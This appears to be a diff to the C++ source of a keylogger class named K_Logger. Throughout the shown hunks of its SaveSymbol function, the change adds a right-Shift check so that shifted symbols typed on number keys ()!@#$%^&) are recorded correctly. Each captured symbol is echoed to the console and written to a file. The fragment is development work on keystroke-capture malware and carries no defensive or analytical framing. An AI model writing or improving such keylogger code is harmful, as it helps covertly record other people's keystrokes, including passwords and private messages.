@@ -14,7 +14,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 	switch (iKey)
 	{
 		case 48:
-			if (GetAsyncKeyState(0xA0))
+			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
 			{
 				std::cout << ")";
 				WriteToFile(")");
@@ -27,7 +27,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 49:
-			if (GetAsyncKeyState(0xA0))
+			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
 			{
 				std::cout << "!";
 				WriteToFile("!");
@@ -40,7 +40,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 50:
-			if (GetAsyncKeyState(0xA0))
+			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
 			{
 				std::cout << "@";
 				WriteToFile("@");
@@ -53,7 +53,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 51:
-			if (GetAsyncKeyState(0xA0))
+			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
 			{
 				std::cout << "#";
 				WriteToFile("#");
@@ -66,7 +66,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 52:
-			if (GetAsyncKeyState(0xA0))
+			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
 			{
 				std::cout << "$";
 				WriteToFile("$");
@@ -79,7 +79,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 53:
-			if (GetAsyncKeyState(0xA0))
+			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
 			{
 				std::cout << "%";
 				WriteToFile("%");
@@ -92,7 +92,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 54:
-			if (GetAsyncKeyState(0xA0))
+			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
 			{
 				std::cout << "^";
 				WriteToFile("^");
@@ -105,7 +105,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			break;
 
 		case 55:
-			if (GetAsyncKeyState(0xA0))
+			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
 			{
 				std::cout << "&";
 				WriteToFile("&");
